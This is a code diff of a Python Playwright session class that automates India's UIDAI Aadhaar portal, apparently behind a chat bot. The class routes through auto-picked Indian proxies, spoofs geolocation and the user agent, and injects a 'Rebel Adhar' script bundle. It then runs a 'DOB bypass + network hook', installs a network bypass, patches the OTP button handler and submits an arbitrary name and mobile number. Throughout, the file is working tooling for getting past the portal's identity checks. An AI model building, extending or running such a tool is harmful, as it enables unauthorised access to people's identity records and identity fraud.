@@ -1,17 +1,15 @@
-"""Playwright session — UIDAI + Rebel Adhar page bundle + Indian proxy."""
+"""Playwright — UIDAI fast: pre-warm browser, commit mode, no GIF."""
 
 from __future__ import annotations
 
 import asyncio
-import io
 import json
 import logging
 from collections.abc import Awaitable, Callable
 from pathlib import Path
 from typing import Any
 
-from PIL import Image
-from playwright.async_api import Browser, Page, Playwright, async_playwright
+from playwright.async_api import Browser, BrowserContext, Page, Playwright, async_playwright
 
 from proxy_india import check_proxy, format_proxy_line, pick_indian_proxy
 
@@ -24,7 +22,6 @@ MOBILE_UA = (
 )
 StepCb = Callable[[int, int, str], Awaitable[None]]
 
-# GIF frame screenshot — font load pe hang na ho
 SKIP_FONTS_JS = """(() => {
   if (document.getElementById('rebel-skip-fonts')) return;
   const s = document.createElement('style');
@@ -32,6 +29,51 @@ SKIP_FONTS_JS = """(() => {
   s.textContent = '*{font-family:Arial,Helvetica,sans-serif!important}';
   (document.head || document.documentElement).appendChild(s);
 })();"""
+
+# Pre-warm pool — Chromium band mat karo har /open pe
+_POOL: dict[str, Any] = {
+    'lock': asyncio.Lock(),
+    'pw': None,
+    'browser': None,
+    'proxy': None,
+}
+
+
+async def _pool_shutdown() -> None:
+    async with _POOL['lock']:
+        if _POOL['browser']:
+            await _POOL['browser'].close()
+        if _POOL['pw']:
+            await _POOL['pw'].stop()
+        _POOL['pw'] = None
+        _POOL['browser'] = None
+        _POOL['proxy'] = None
+
+
+async def _pool_browser(proxy: str | None) -> Browser:
+    async with _POOL['lock']:
+        if _POOL['browser'] and _POOL['proxy'] == proxy:
+            log.info('Pre-warm: browser reuse (proxy=%s)', proxy or 'direct')
+            return _POOL['browser']
+
+        if _POOL['browser']:
+            await _POOL['browser'].close()
+            _POOL['browser'] = None
+        if _POOL['pw']:
+            await _POOL['pw'].stop()
+            _POOL['pw'] = None
+
+        log.info('Pre-warm: naya browser launch (proxy=%s)', proxy or 'direct')
+        _POOL['pw'] = await async_playwright().start()
+        opts: dict[str, Any] = {
+            'headless': True,
+            'args': ['--disable-remote-fonts', '--no-sandbox', '--disable-dev-shm-usage'],
+        }
+        if proxy:
+            opts['proxy'] = {'server': proxy}
+        _POOL['browser'] = await _POOL['pw'].chromium.launch(**opts)
+        _POOL['proxy'] = proxy
+        return _POOL['browser']
 
 
 class UidaiBrowserSession:
@@ -46,14 +88,14 @@ class UidaiBrowserSession:
         self.proxy = proxy
         self.auto_india_proxy = auto_india_proxy
         self._on_step = on_step
-        self._pw: Playwright | None = None
-        self._browser: Browser | None = None
+        self._context: BrowserContext | None = None
         self._page: Page | None = None
         self.name = ''
         self.mobile = ''
         self.last_logs: list[dict[str, Any]] = []
         self.proxy_info: dict[str, Any] = {}
         self.proxy_label = ''
+        self._active_proxy: str | None = None
 
     @property
     def page(self) -> Page:
@@ -67,23 +109,21 @@ class UidaiBrowserSession:
 
     async def _resolve_proxy(self) -> str | None:
         if self.proxy and self.proxy.lower() not in ('auto', 'india'):
-            await self._step(1, 8, 'Indian proxy check kar raha hoon…')
-            info = await asyncio.to_thread(check_proxy, self.proxy)
+            await self._step(1, 8, 'Indian proxy check…')
+            info = await asyncio.to_thread(check_proxy, self.proxy, 4)
             if info.get('countryCode') != 'IN':
-                raise RuntimeError(
-                    f'Proxy India nahi hai: {info.get("country")} ({info.get("query")})'
-                )
+                raise RuntimeError(f'Proxy India nahi: {info.get("country")}')
             self.proxy_info = info
             self.proxy_label = format_proxy_line(info, self.proxy)
             await self._step(1, 8, f'VPN connected — {self.proxy_label}')
             return self.proxy
 
         if not self.auto_india_proxy and not self.proxy:
-            await self._step(1, 8, 'Bina proxy — direct connect (India IP nahi)')
-            self.proxy_label = '⚠️ Direct (no Indian VPN)'
+            self.proxy_label = '⚠️ Direct'
+            await self._step(1, 8, 'Direct connect')
             return None
 
-        await self._step(1, 8, 'Indian VPN dhundh raha hoon…')
+        await self._step(1, 8, 'Indian VPN connect…')
         proxy, info = await asyncio.to_thread(pick_indian_proxy)
         self.proxy = proxy
         self.proxy_info = info
@@ -91,27 +131,12 @@ class UidaiBrowserSession:
         await self._step(1, 8, f'VPN connected — {self.proxy_label}')
         return proxy
 
-    async def start(self) -> None:
-        if self._browser:
-            return
-
-        await self._step(1, 8, 'Chromium browser start ho raha hai…')
-        proxy = await self._resolve_proxy()
-
-        self._pw = await async_playwright().start()
-        launch_opts: dict[str, Any] = {
-            'headless': True,
-            'args': [
-                '--disable-remote-fonts',
-                '--no-sandbox',
-                '--disable-dev-shm-usage',
-            ],
-        }
-        if proxy:
-            launch_opts['proxy'] = {'server': proxy}
-
-        self._browser = await self._pw.chromium.launch(**launch_opts)
-        context = await self._browser.new_context(
+    async def _new_page(self, proxy: str | None) -> None:
+        if self._context:
+            await self._context.close()
+        browser = await _pool_browser(proxy)
+        self._active_proxy = proxy
+        self._context = await browser.new_context(
             viewport={'width': 390, 'height': 844},
             user_agent=MOBILE_UA,
             locale='en-IN',
@@ -119,32 +144,30 @@ class UidaiBrowserSession:
             geolocation={'latitude': 28.6139, 'longitude': 77.2090},
             permissions=['geolocation'],
         )
-        await context.add_init_script(SKIP_FONTS_JS)
-        self._page = await context.new_page()
-        await self._step(2, 8, 'Browser ready — India timezone (Asia/Kolkata)')
+        await self._context.add_init_script(SKIP_FONTS_JS)
+        self._page = await self._context.new_page()
 
-    async def _fast_screenshot(self) -> bytes | None:
-        """Screenshot bina font-hang ke — fail ho to None."""
-        try:
-            await self.page.evaluate(SKIP_FONTS_JS)
-            return await self.page.screenshot(
-                full_page=False,
-                timeout=8_000,
-                animations='disabled',
-                caret='hide',
-            )
-        except Exception as e:
-            log.warning('screenshot skip: %s', e)
-            return None
+    async def start(self) -> None:
+        if self._page:
+            return
+        proxy = await self._resolve_proxy()
+        reused = _POOL['browser'] is not None and _POOL['proxy'] == proxy
+        if reused:
+            await self._step(2, 8, 'Browser pre-warm — turant ready ⚡')
+        else:
+            await self._step(2, 8, 'Chromium start…')
+        await self._new_page(proxy)
+        if not reused:
+            await self._step(2, 8, 'Browser ready — India timezone (Asia/Kolkata)')
 
-    async def close(self) -> None:
-        if self._browser:
-            await self._browser.close()
-        if self._pw:
-            await self._pw.stop()
-        self._browser = None
-        self._pw = None
+    async def close(self, keep_warm: bool = True) -> None:
+        """Page band — browser pool me rakho (keep_warm=True)."""
+        if self._context:
+            await self._context.close()
+        self._context = None
         self._page = None
+        if not keep_warm:
+            await _pool_shutdown()
 
     async def _inject_rebel(self) -> dict[str, Any]:
         bundle = self.bundle_path.read_text(encoding='utf-8')
@@ -159,92 +182,70 @@ class UidaiBrowserSession:
             bundle,
         )
 
+    async def _poll_form(self, max_sec: float = 25.0) -> bool:
+        for _ in range(int(max_sec / 0.15)):
+            if await self.page.locator('input[name="name"]').count():
+                return True
+            await asyncio.sleep(0.15)
+        return False
+
     async def open_form(self, name: str, mobile: str, on_frame=None) -> bytes:
-        """Navigate, inject Rebel, fill name/mobile. Returns animated GIF bytes."""
+        """commit mode + fast poll — GIF band (hamesha empty)."""
         self.name = name.strip()
         self.mobile = mobile.strip()
-        frames: list[Image.Image] = []
 
-        async def snap(label: str = '') -> None:
-            if on_frame:
-                await on_frame(label)
-            png = await self._fast_screenshot()
-            if png:
-                try:
-                    img = Image.open(io.BytesIO(png)).convert('RGB')
-                    frames.append(img)
-                except Exception:
-                    pass
-
-        await self._step(3, 8, f'UIDAI site open: {UIDAI_URL}')
+        await self._step(3, 8, 'UIDAI site open (fast)…')
         last_err: Exception | None = None
         for attempt in range(3):
             try:
                 await self.page.goto(
                     UIDAI_URL,
-                    wait_until='domcontentloaded',
-                    timeout=120_000,
+                    wait_until='commit',
+                    timeout=45_000,
                 )
-                await self.page.wait_for_selector('body', timeout=30_000)
-                last_err = None
-                break
+                if await self._poll_form(22.0):
+                    last_err = None
+                    break
+                raise RuntimeError('Form fields timeout')
             except Exception as e:
                 last_err = e
-                await self._step(3, 8, f'Retry {attempt + 1}/3 — site slow…')
-                await asyncio.sleep(2)
+                await self._step(3, 8, f'Retry {attempt + 1}/3…')
+                await asyncio.sleep(1)
         if last_err:
             raise RuntimeError(f'UIDAI open fail: {last_err}') from last_err
-        await snap('Site khul rahi hai…')
+
         await self._step(3, 8, 'UIDAI page load ho gayi')
+        await self._step(4, 8, 'Form mil gaya — naam/mobile fields ready')
 
-        await self._step(4, 8, 'Form fields wait kar raha hoon…')
-        for i in range(30):
-            if await self.page.locator('input[name="name"]').count():
-                await self._step(4, 8, 'Form mil gaya — naam/mobile fields ready')
-                break
-            await asyncio.sleep(1)
-            if i % 5 == 4:
-                await self._step(4, 8, f'Form load… ({i + 1}s)')
-            await snap('Form load…')
-        else:
-            raise RuntimeError('Form load nahi hua — proxy/VPN check karo')
-
-        await self._step(5, 8, 'Rebel Adhar engine inject ho raha hai…')
+        await self._step(5, 8, 'Rebel Adhar engine inject…')
         inj = await self._inject_rebel()
-        await asyncio.sleep(3)
-        ver = ''
-        if isinstance(inj, dict):
-            ver = inj.get('v') or ''
-        await self._step(5, 8, f'Rebel Adhar ON {("(v" + ver + ")") if ver else ""}')
-        await snap('Rebel Adhar ON')
+        await asyncio.sleep(1)
+        ver = inj.get('v', '') if isinstance(inj, dict) else ''
+        await self._step(5, 8, f'Rebel Adhar ON{(f" (v{ver})" if ver else "")}')
 
         await self._step(6, 8, f'Naam bhara: {self.name}')
         await self.page.fill('input[name="name"]', self.name)
         await self._step(7, 8, f'Mobile bhara: {self.mobile}')
         await self.page.fill('input[name="mobile"]', self.mobile)
-        await snap('Name + Mobile bhara')
 
-        await self._step(8, 8, 'Captcha image load ho rahi hai…')
-        await self._wait_captcha_image()
-        await self._step(8, 8, 'Captcha ready — photo bhej raha hoon')
-        await snap('Captcha ready')
+        await self._step(8, 8, 'Captcha load…')
+        await self._wait_captcha_image(20)
+        await self._step(8, 8, 'Captcha ready')
+        return b''
 
-        return self._frames_to_gif(frames)
-
-    async def _wait_captcha_image(self, timeout_s: int = 40) -> None:
+    async def _wait_captcha_image(self, timeout_s: int = 20) -> None:
         el = self.page.locator('img[alt*="CAPTCHA" i]').first
         await el.wait_for(state='visible', timeout=timeout_s * 1000)
-        for _ in range(timeout_s):
-            ok = await el.evaluate('(img) => img.complete && img.naturalWidth > 10')
-            if ok:
+        for _ in range(timeout_s * 4):
+            if await el.evaluate('(img) => img.complete && img.naturalWidth > 10'):
                 return
-            await asyncio.sleep(1)
-        raise RuntimeError('Captcha image load nahi hui — /refresh try karo')
+            await asyncio.sleep(0.25)
+        raise RuntimeError('Captcha load fail — /refresh')
 
     async def captcha_png(self) -> bytes:
         await self._wait_captcha_image()
         el = self.page.locator('img[alt*="CAPTCHA" i]').first
-        return await el.screenshot(type='png')
+        return await el.screenshot(type='png', timeout=8_000)
 
     async def refresh_captcha(self) -> bytes:
         refresh = self.page.locator(
@@ -257,7 +258,7 @@ class UidaiBrowserSession:
                 pass
         else:
             await self.page.locator('img[alt*="CAPTCHA" i]').first.click()
-        await asyncio.sleep(2)
+        await asyncio.sleep(1)
         await self._wait_captcha_image()
         return await self.captcha_png()
 
@@ -270,15 +271,14 @@ class UidaiBrowserSession:
             if step_fn:
                 await step_fn(n, total, msg)
 
-        await s(1, f'Captcha field me likh raha hoon: {captcha}')
+        await s(1, f'Captcha fill: {captcha}')
         await self.page.fill('input[name="captcha"]', captcha)
-
         await s(2, 'DOB bypass + network hook ON…')
-        await s(3, 'Send OTP button tap…')
+        await s(3, 'Send OTP tap…')
         result = await self.page.evaluate(
             """async (cap) => {
               const E = window.UidaiRetrieveEngine;
-              if (!E) return { ok: false, err: 'Engine missing — /open dubara' };
+              if (!E) return { ok: false, err: 'Engine missing' };
               const logs = [];
               const log = (l, m, d) => logs.push({ l, m, d });
               E.installNetworkBypass({ log, enabled: () => true });
@@ -288,32 +288,22 @@ class UidaiBrowserSession:
               E.patchReactOtpClick('#tg', log);
               const inp = document.querySelector('input[name="captcha"]');
               if (inp) E.setReactInputValue(inp, cap, log);
-              const btn = E.findOtpButton();
-              E.getReactProps(btn)?.onClick?.({});
+              E.getReactProps(E.findOtpButton())?.onClick?.({});
               await new Promise((r) => setTimeout(r, 8000));
-              return {
-                ok: true,
-                logs,
-                version: E.ENGINE_VERSION,
-                diag: E.getFormDiagnostics ? E.getFormDiagnostics('#tg') : null,
-              };
+              return { ok: true, logs, version: E.ENGINE_VERSION,
+                diag: E.getFormDiagnostics ? E.getFormDiagnostics('#tg') : null };
             }""",
             captcha,
         )
-
-        await s(4, 'UIDAI server jawab aaya')
-        await s(5, 'OTP request complete — logs collect')
-
+        await s(4, 'UIDAI jawab aaya')
+        await s(5, 'Done')
         self.last_logs = result.get('logs') or []
-        screen = await self._fast_screenshot()
-        summary = self._summarize_logs(self.last_logs)
         return {
             'captcha': captcha,
-            'summary': summary,
+            'summary': self._summarize_logs(self.last_logs),
             'logs': self.last_logs[-12:],
             'diag': result.get('diag'),
             'version': result.get('version'),
-            'screen_png': screen,
             'proxy_label': self.proxy_label,
         }
 
@@ -324,25 +314,6 @@ class UidaiBrowserSession:
             msg = item.get('m') or item.get('msg') or ''
             level = item.get('l') or item.get('level') or 'info'
             data = item.get('d') or item.get('data')
-            extra = ''
-            if data is not None:
-                extra = ' ' + (json.dumps(data) if not isinstance(data, str) else data)
+            extra = f' {json.dumps(data)}' if data is not None else ''
             lines.append(f'[{level}] {msg}{extra}')
         return '\n'.join(lines[-15:]) or 'Koi log nahi'
-
-    @staticmethod
-    def _frames_to_gif(frames: list[Image.Image]) -> bytes:
-        if not frames:
-            return b''
-        out = io.BytesIO()
-        dur = 700
-        frames[0].save(
-            out,
-            format='GIF',
-            save_all=True,
-            append_images=frames[1:],
-            duration=dur,
-            loop=0,
-            optimize=True,
-        )
-        return out.getvalue()
